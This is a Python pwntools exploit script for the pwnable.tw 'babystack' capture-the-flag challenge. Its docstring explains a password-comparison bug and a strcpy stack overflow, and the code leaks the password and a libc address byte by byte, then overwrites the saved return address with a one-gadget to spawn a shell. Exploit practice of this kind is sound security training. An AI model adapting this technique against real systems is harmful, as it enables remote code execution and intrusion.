#!/usr/bin/env python3

from pwn import *

exe = ELF("babystack_patched")
libc = ELF("libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.terminal=['tmux','splitw', '-h']

def conn():
    if args.LOCAL:
        # r = process([exe.path])
        r = gdb.debug([exe.path], '''
        set follow-fork-mode child
        ''')
    else:
        r = remote("chall.pwnable.tw", 10205)

    return r

def compare_password(pwd):
    r.sendlineafter(b'>> ', b'1')
    r.sendafter(b':', pwd)

def copy(data):
    r.sendlineafter(b'>>', b'3')
    r.sendafter(b':', data)

def leave():
    r.sendlineafter(b'>>', b'2')

def itob(i): return i.to_bytes(byteorder='little', length=1)

def main():
    '''
There are two vulnerabilities. First, there's an improper string comparison, where we're able to control the number of bytes compared. This works because read() allows you to input less than the number of bytes requested. Here's the vulnerable code in question (simplified for clarity):

if (!strncpy(password, input, strlen(input))) {
    puts("Success");
} else {
    puts ("Fail");
}

This really should be strncpy(password, input, strlen(password)).



The other vulnerability is a buffer overflow caused by improper string termination. A user-supplied string gets copied onto a stack buffer. However, if the user-supplied string contains no null terminator, then the bytes AFTER the string will also be copied into the buffer. Note that the user-supplied string is also stored on the stack, and that the bytes succeeding it in memory consist of the residual memory from a previous stack frame.

The code is like this:

char input[128];
int n = read(0, input, 64);
if (input[n-1] == '\n') // note: if the string doesn't end in a \0 or a \n, it will not be null-terminated
    input[n-1] = '\0';
// additional, uninitialized bytes inside input will ALSO be copied into buf if input doesn't end in a null terminator
strcpy(buf, input); // buf is on the stack, at a higher address than input



The first vulnerability can be used to leak any value in the password buffer byte-by-byte. Thus, we have a read primitive.
The second vulnerability can be used to write any value to the password buffer. Additionally, it can be used to overwrite the return address. Thus, we have a write primitive.

The exploit plan is as follows:
1) Leak the original, randomized password using the first vulnerability. This is necessary to bypass the check at the end of the function, which ensures that the password buffer has not been modified. When we overflow the buffer eventually, we will need to write the correct password here.

2) Bypass ASLR by using the second vulnerability to write a libc pointer into the password buffer, then the first vulnerability to leak it.

3) Use the second vulnerability to overwrite the saved RIP and call a one gadget.
    '''

    global r
    r = conn()

    # leak the password
    password_leak = bytearray()
    for _ in range(16):
        for i in range(1,0xff+1):
            compare_password(bytes(password_leak) + itob(i) + b'\x00')
            result = r.readuntil(b'!').decode()
            if 'Success' in result:
                password_leak.append(i)
                print(password_leak)

                # after success, we must set g_authorized to 0 so we can do another comparison
                r.sendlineafter(b'>> ', b'1')
                break
    print(password_leak)

    # leak a libc pointer
    # this copies the pointer into password
    compare_password(b'\x00'+b'A'*(9*8-1))
    copy(b'A')
    r.sendlineafter(b'>>', b'1') # set g_authorized to 0

    aslr_leak = bytearray()
    for _ in range(8):
        for i in range(1,0xff+1):
            compare_password(b'A'*8 + bytes(aslr_leak) + itob(i) + b'\x00')
            result = r.readuntil(b'!').decode()
            if 'Success' in result:
                aslr_leak.append(i)
                print(aslr_leak)
                r.sendlineafter(b'>>', b'1')
                break
    print(aslr_leak)
    libc_base = u64(bytes(aslr_leak) + b'\x00\x00') - 492601
    print(hex(libc_base))
    one_gadget = libc_base + 0x45216
    print(hex(one_gadget))

    # we have a buffer overflow to saved rip; can call one gadget
    # where is infoleak? need ASLR infoleak

    # first 64 bytes are junk
    # next 16 bytes are the password (otherwise, stack check fails)
    # next 16+8 bytes are junk (including saved rbp)
    # next 8 bytes are saved RIP
    compare_password(b'\x00'+b'A'*63 + bytes(password_leak) + b'A'*24 + p64(one_gadget))
    copy(b'B') # exploit the strcpy

    leave()

    r.interactive()


if __name__ == "__main__":
    main()
